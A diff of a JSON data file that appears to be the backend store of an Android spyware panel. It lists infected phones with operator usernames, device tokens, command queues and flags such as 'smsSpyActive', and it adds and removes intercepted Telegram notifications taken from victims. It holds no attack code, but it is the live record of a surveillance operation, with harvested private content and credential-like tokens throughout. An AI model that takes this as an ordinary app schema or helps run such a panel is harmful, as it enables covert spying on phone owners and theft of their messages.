@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781806126,
+    "lastSeen": 1776781807176,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781808537
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781806677
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781806642
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
@@ -14378,30 +14402,6 @@
         "time": "21/04 21:08",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776780528874
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:08",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780526593
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 21:08",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780526575
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16922 pesan baru dari 118 obrolan",
-        "time": "21/04 21:08",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780526556
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781804727,
+    "lastSeen": 1776781807839,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
